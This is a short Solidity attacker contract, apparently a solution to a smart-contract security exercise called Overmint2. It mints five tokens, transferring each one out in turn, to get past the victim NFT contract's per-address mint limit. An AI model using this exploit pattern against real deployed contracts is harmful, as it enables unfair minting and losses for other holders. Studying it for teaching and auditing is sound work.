// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/utils/Address.sol";
// import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./Overmint2.sol";

contract Overmint2Attacker {
    Overmint2 public victim;
    address public attacker;

    constructor(address _victim) {
        victim = Overmint2(_victim);
        attacker = msg.sender;

        victim.mint();
        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());

        victim.mint();
        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());

        victim.mint();
        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());

        victim.mint();
        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());

        victim.mint();
        victim.safeTransferFrom(address(this), attacker, victim.totalSupply());
    }
}
